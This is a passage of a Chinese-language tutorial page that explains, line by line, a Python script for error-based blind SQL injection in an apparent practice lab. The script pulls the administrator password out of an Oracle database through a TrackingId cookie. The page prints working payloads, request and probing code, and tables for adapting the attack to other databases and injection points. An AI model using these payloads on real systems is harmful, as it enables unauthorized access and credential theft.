+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="mi">43</span>          <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">TRACKING</span><span class="si">}</span><span class="s2">'and(select case when("</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="mi">44</span>          <span class="sa">f</span><span class="s2">"ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">ascii_val</span><span class="si">}</span><span class="s2">"</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="mi">45</span>          <span class="sa">f</span><span class="s2">") then to_char(1/0) else 'a' end from dual)='a'--"</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="mi">46</span>      <span class="p">)</span>
+</span></code></pre></div>
+<p><strong>这段就是整个脚本的灵魂。</strong> 拆成三段 <code>f-string</code> 只是为了换行易读，最终拼出：</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">a3HRZtX4AN2q3pTa</span><span class="s1">' and(select case when(</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="s1">  ASCII(SUBSTR((SELECT password FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">'),1,1))&gt;77</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="s1">) then to_char(1/0) else '</span><span class="n">a</span><span class="s1">' end from dual)='</span><span class="n">a</span><span class="err">'</span><span class="c1">--</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>拆解</th>
+<th>改造点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>43</strong></td>
+<td><code>{TRACKING}'</code> —— 原值 + 单引号闭合字符串</td>
+<td>注入点若不是 <code>'</code> 包裹（数字型），这里要改</td>
+</tr>
+<tr>
+<td><strong>44</strong></td>
+<td><code>ASCII(SUBSTR((子查询),pos,1))&gt;N</code></td>
+<td><strong>核心条件</strong>：取第 pos 字符的 ASCII 码，判断是否 &gt; N</td>
+</tr>
+<tr>
+<td><strong>45</strong></td>
+<td><code>then to_char(1/0) else 'a' end from dual)='a'--</code></td>
+<td>真→除零；假→返回 <code>'a'</code>；<code>--</code> 注释掉应用补的收尾引号</td>
+</tr>
+</tbody>
+</table>
+<h3 id="44">44 行的可替换部件<a class="headerlink" href="#44" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>部件</th>
+<th>当前值</th>
+<th>换成</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>password</code></td>
+<td>列名</td>
+<td>目标列</td>
+</tr>
+<tr>
+<td><code>users</code></td>
+<td>表名</td>
+<td>目标表</td>
+</tr>
+<tr>
+<td><code>username='administrator'</code></td>
+<td>过滤条件</td>
+<td>目标用户</td>
+</tr>
+<tr>
+<td><code>SUBSTR</code></td>
+<td>Oracle 函数</td>
+<td>MySQL/PG 用 <code>SUBSTRING</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="45">45 行：不同数据库的「报错装置」<a class="headerlink" href="#45" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>制造错误的方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Oracle</strong></td>
+<td><code>TO_CHAR(1/0)</code>（类型必须转成字符串）</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>1/0</code>（可不转）</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>1/0</code>、<code>EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))</code></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>记忆点</strong>：<strong>44 行 = 「什么条件下崩」，45 行 = 「怎么让它崩」。</strong></p>
+</blockquote>
+<hr />
+<h2 id="4953-http">五、第 49–53 行：发一个 HTTP 请求<a class="headerlink" href="#4953-http" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="mi">49</span>  <span class="k">def</span><span class="w"> </span><span class="nf">send</span><span class="p">(</span><span class="n">cookie_value</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="mi">50</span>      <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"TrackingId"</span><span class="p">:</span> <span class="n">cookie_value</span><span class="p">}</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="mi">51</span>      <span class="k">if</span> <span class="n">SESSION</span><span class="p">:</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="mi">52</span>          <span class="n">cookies</span><span class="p">[</span><span class="s2">"session"</span><span class="p">]</span> <span class="o">=</span> <span class="n">SESSION</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="mi">53</span>      <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE_URL</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="n">VERIFY_SSL</span><span class="p">)</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>50</strong></td>
+<td>构造 cookie 字典。<strong>键名 <code>TrackingId</code> 必须与目标一致</strong></td>
+</tr>
+<tr>
+<td><strong>51–52</strong></td>
+<td>有 session 才加，避免传空串污染 cookie</td>
+</tr>
+<tr>
+<td><strong>53</strong></td>
+<td>发 GET；requests 自动处理 URL 编码</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>⭐ 换注入位置只改第 53 行：</strong></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>注入点</th>
+<th>改法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cookie</td>
+<td><code>requests.get(BASE_URL, cookies={"TrackingId": v})</code></td>
+</tr>
+<tr>
+<td>URL 参数</td>
+<td><code>requests.get(BASE_URL, params={"id": v})</code></td>
+</tr>
+<tr>
+<td>POST 表单</td>
+<td><code>requests.post(BASE_URL, data={"id": v})</code></td>
+</tr>
+<tr>
+<td>请求头</td>
+<td><code>requests.get(BASE_URL, headers={"User-Agent": v})</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="5669">六、第 56–69 行：单次探测（问一个是非题）<a class="headerlink" href="#5669" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="mi">56</span>  <span class="k">def</span><span class="w"> </span><span class="nf">probe</span><span class="p">(</span><span class="n">pos</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">ascii_val</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="mi">57</span>      <span class="s2">"""True 表示 ASCII(SUBSTR(...)) &gt; ascii_val(即触发了 500)"""</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="mi">58</span>      <span class="n">cookie</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">ascii_val</span><span class="p">)</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="mi">59</span>      <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="mi">60</span>          <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="mi">61</span>              <span class="n">r</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="mi">62</span>              <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">or</span> <span class="s2">"Internal Server Error"</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="mi">63</span>                  <span class="k">return</span> <span class="kc">True</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="mi">64</span>              <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="mi">65</span>          <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="mi">66</span>              <span class="k">if</span> <span class="n">attempt</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="mi">67</span>                  <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">"probe failed: pos=</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">, ascii&gt;</span><span class="si">{</span><span class="n">ascii_val</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="mi">68</span>              <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.4</span><span class="p">)</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="mi">69</span>      <span class="k">return</span> <span class="kc">False</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>58</strong></td>
+<td>生成本次要发的 SQL</td>
+</tr>
+<tr>
+<td><strong>59</strong></td>
+<td>最多试 3 次，应对网络抖动</td>
+</tr>
+<tr>
+<td><strong>61</strong></td>
+<td>真的发请求</td>
+</tr>
+<tr>
+<td><strong>62</strong></td>
+<td>⭐ <strong>判断「报错」的两条依据</strong>：① 状态码 500 ② 页面含 <code>Internal Server Error</code>。用 <code>or</code>，命中任一即算</td>
+</tr>
+<tr>
+<td><strong>63</strong></td>
+<td>返回 <code>True</code> = 条件为真（真 → 除零 → 500）</td>
+</tr>
+<tr>
+<td><strong>64</strong></td>
+<td>返回 <code>False</code> = 条件为假</td>
+</tr>
+<tr>
+<td><strong>65</strong></td>
+<td>网络异常（超时 / DNS）走这里</td>
+</tr>
+<tr>
+<td><strong>66–68</strong></td>
+<td>前两次失败等 0.4 秒重试；第 3 次仍失败则抛异常</td>
+</tr>
+<tr>
+<td><strong>69</strong></td>
+<td>理论不可达（循环内必有返回），防御性代码</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>⭐ <strong>第 62 行是「漏洞类型」的开关。</strong> 换题型主要改这里：</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>题型</th>
+<th>判断依据</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>条件错误</strong>（本脚本）</td>
+<td><code>r.status_code == 500</code></td>
+</tr>
+<tr>
+<td><strong>条件响应</strong></td>
+<td><code>"Welcome back" in r.text</code></td>
+</tr>
+<tr>
+<td><strong>时间盲注</strong></td>
+<td><code>r.elapsed.total_seconds() &gt; 5</code></td>
+</tr>
+<tr>
+<td><strong>布尔盲注（长度差异）</strong></td>
+<td><code>len(r.text) &gt; 1000</code></td>
+</tr>
+<tr>
+<td><strong>带外 / OOB</strong></td>
+<td>查 DNS 平台日志（不适合写进脚本）</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7281">七、第 72–81 行：二分查找（核心算法）<a class="headerlink" href="#7281" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="mi">72</span>  <span class="k">def</span><span class="w"> </span><span class="nf">find_char</span><span class="p">(</span><span class="n">pos</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="mi">73</span>      <span class="s2">"""对第 pos 位做二分查找,返回该字符"""</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="mi">74</span>      <span class="n">lo</span><span class="p">,</span> <span class="n">hi</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">126</span>          <span class="c1"># 可打印 ASCII 范围</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="mi">75</span>      <span class="k">while</span> <span class="n">lo</span> <span class="o">&lt;</span> <span class="n">hi</span><span class="p">:</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="mi">76</span>          <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="n">hi</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="mi">77</span>          <span class="k">if</span> <span class="n">probe</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">mid</span><span class="p">):</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="mi">78</span>              <span class="n">lo</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>      <span class="c1"># 字符码 &gt; mid</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="mi">79</span>          <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="mi">80</span>              <span class="n">hi</span> <span class="o">=</span> <span class="n">mid</span>          <span class="c1"># 字符码 &lt;= mid</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="mi">81</span>      <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">lo</span><span class="p">)</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>74</strong></td>
+<td>搜索范围：<code>32</code>（空格）~ <code>126</code>（<code>~</code>），即可打印字符</td>
+</tr>
+<tr>
+<td><strong>75</strong></td>
+<td>范围没缩到 1 个值就继续</td>
+</tr>
+<tr>
+<td><strong>76</strong></td>
+<td>取中点</td>
+</tr>
+<tr>
+<td><strong>77</strong></td>
+<td>问数据库：「这个字符的 ASCII 码<strong>大于</strong> mid 吗？」</td>
+</tr>
+<tr>
+<td><strong>78</strong></td>
+<td>是 → 在右半区 → 左边界抬到 <code>mid+1</code></td>
+</tr>
+<tr>
+<td><strong>80</strong></td>
+<td>否 → 在左半区 → 右边界降到 <code>mid</code></td>
+</tr>
+<tr>
+<td><strong>81</strong></td>
+<td>收敛后 <code>lo == hi</code>，就是 ASCII 码，转成字符</td>
+</tr>
+</tbody>
+</table>
+<h3 id="7">为什么 7 次一定能找到<a class="headerlink" href="#7" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>32~126          95 个可能值
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>二分 1 次 →     47
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>二分 2 次 →     23
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>二分 3 次 →     11
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>二分 4 次 →      5
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>二分 5 次 →      2
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>二分 6 次 →      1   ← 确定
+</span></code></pre></div>
+<p><strong>log₂(95) ≈ 6.6，故最多 7 次。</strong></p>
+<h3 id="_3">改造点<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>需求</th>
+<th>改法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>已知只有 <code>a-z0-9</code></td>
+<td>第 74 行改 <code>lo, hi = 48, 122</code>，再过滤掉非法区间</td>
+</tr>
+<tr>
+<td>逐位顺序执行（不计较慢）</td>
+<td>把 <code>probe</code> 换成顺序循环，不用线程池</td>
+</tr>
+<tr>
+<td>Unicode / 中文</td>
+<td>ASCII 二分<strong>不适用</strong>，改用 <code>SUBSTR(...)&gt;'某字'</code> + 手工字符表</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="84105">八、第 84–105 行：通道自检（开机自检）<a class="headerlink" href="#84105" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="mi">84</span>  <span class="k">def</span><span class="w"> </span><span class="nf">sanity_check</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="mi">85</span>      <span class="s2">"""通道自检:用常量验证 1=1 报错、1=2 不报错"""</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="mi">86</span>      <span class="nb">print</span><span class="p">(</span><span class="s2">"[*] 通道自检中..."</span><span class="p">)</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="mi">87</span>      <span class="n">tests</span> <span class="o">=</span> <span class="p">[</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="mi">88</span>          <span class="p">(</span><span class="s2">"1=1"</span><span class="p">,</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">TRACKING</span><span class="si">}</span><span class="s2">'and(select case when(1=1) then to_char(1/0) else 'a' end from dual)='a'--"</span><span class="p">,</span> <span class="kc">True</span><span class="p">),</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="mi">89</span>          <span class="p">(</span><span class="s2">"1=2"</span><span class="p">,</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">TRACKING</span><span class="si">}</span><span class="s2">'and(select case when(1=2) then to_char(1/0) else 'a' end from dual)='a'--"</span><span class="p">,</span> <span class="kc">False</span><span class="p">),</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="mi">90</span>      <span class="p">]</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="mi">91</span>      <span class="n">ok</span> <span class="o">=</span> <span class="kc">True</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="mi">92</span>      <span class="k">for</span> <span class="n">label</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">expect_error</span> <span class="ow">in</span> <span class="n">tests</span><span class="p">:</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="mi">93</span>          <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="mi">94</span>              <span class="n">r</span> <span class="o">=</span> <span class="n">send</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="mi">95</span>              <span class="n">got_error</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">or</span> <span class="s2">"Internal Server Error"</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="mi">96</span>              <span class="n">mark</span> <span class="o">=</span> <span class="s2">"OK "</span> <span class="k">if</span> <span class="n">got_error</span> <span class="o">==</span> <span class="n">expect_error</span> <span class="k">else</span> <span class="s2">"!! "</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="mi">97</span>              <span class="k">if</span> <span class="n">got_error</span> <span class="o">!=</span> <span class="n">expect_error</span><span class="p">:</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="mi">98</span>                  <span class="n">ok</span> <span class="o">=</span> <span class="kc">False</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="mi">99</span>              <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"    [</span><span class="si">{</span><span class="n">mark</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">label</span><span class="si">:</span><span class="s2">&lt;4</span><span class="si">}</span><span class="s2"> -&gt; HTTP </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2"> "</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="mi">100</span>                   <span class="sa">f</span><span class="s2">"(</span><span class="si">{</span><span class="s1">'500 报错'</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">got_error</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">'200 正常'</span><span class="si">}</span><span class="s2">),预期"</span>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="mi">101</span>                   <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="s1">'500'</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">expect_error</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">'200'</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="mi">102</span>         <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="mi">103</span>             <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"    [!! ] </span><span class="si">{</span><span class="n">label</span><span class="si">}</span><span class="s2"> 请求失败: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="mi">104</span>             <span class="n">ok</span> <span class="o">=</span> <span class="kc">False</span>
+</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="mi">105</span>     <span class="k">return</span> <span class="n">ok</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>87–90</strong></td>
+<td>两个「答案已知」的用例：<code>1=1</code> 必报错、<code>1=2</code> 必正常</td>
+</tr>
+<tr>
+<td><strong>88 / 89</strong></td>
+<td><strong>常量版 payload</strong>，不引用任何列 —— 因此能验证「语法 + 数据库类型 + 报错装置」三件事</td>
+</tr>
+<tr>
+<td><strong>92</strong></td>
+<td>解包三元组：名字、要发的值、预期是否报错</td>
+</tr>
+<tr>
+<td><strong>94</strong></td>
+<td>发请求</td>
+</tr>
+<tr>
+<td><strong>95</strong></td>
+<td>用与第 62 行相同的逻辑算实际结果</td>
+</tr>
+<tr>
+<td><strong>96</strong></td>
+<td>对齐标记 <code>OK</code> / <code>!!</code></td>
+</tr>
+<tr>
+<td><strong>97–98</strong></td>
+<td>任一项不符即整体失败</td>
+</tr>
+<tr>
+<td><strong>99–101</strong></td>
+<td><code>{label:&lt;4}</code> 左对齐占 4 字符，输出整齐</td>
+</tr>
+<tr>
+<td><strong>102–104</strong></td>
+<td>请求本身失败也算不通过</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>为什么值钱</strong>：盲注最难的是「分不清 500 是命中还是写错了」。自检把这个问题前置 —— 不过就直接退出，不浪费 140 条请求。</p>
+</blockquote>
+<hr />
+<h2 id="108160">九、第 108–160 行：主流程<a class="headerlink" href="#108160" title="Permanent link">&para;</a></h2>
+<h3 id="108119">108–119 行：参数检查与横幅<a class="headerlink" href="#108119" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="mi">109</span>     <span class="k">if</span> <span class="s2">"YOUR-LAB-ID"</span> <span class="ow">in</span> <span class="n">BASE_URL</span><span class="p">:</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="mi">110</span><span class="o">-</span><span class="mi">111</span>     <span class="n">提示</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="mi">113</span><span class="o">-</span><span class="mi">119</span> <span class="nb">print</span> <span class="n">横幅</span><span class="p">(</span><span class="n">目标</span> <span class="o">/</span> <span class="n">长度</span> <span class="o">/</span> <span class="n">并发</span> <span class="o">/</span> <span class="n">预估请求</span><span class="p">)</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>109</strong></td>
+<td>防呆：忘改 <code>BASE_URL</code> 时直接退出，而不是请求一个不存在的域名</td>
+</tr>
+<tr>
+<td><strong>113–119</strong></td>
+<td>打印本次运行的参数，便于事后核对</td>
+</tr>
+<tr>
+<td><strong>118</strong></td>
+<td><code>PASSWORD_LEN * 7</code> 是预估请求数（每位约 7 次二分）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="121125">121–125 行：自检闸门<a class="headerlink" href="#121125" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="mi">121</span>     <span class="k">if</span> <span class="ow">not</span> <span class="n">sanity_check</span><span class="p">():</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="mi">122</span><span class="o">-</span><span class="mi">123</span>     <span class="n">提示</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
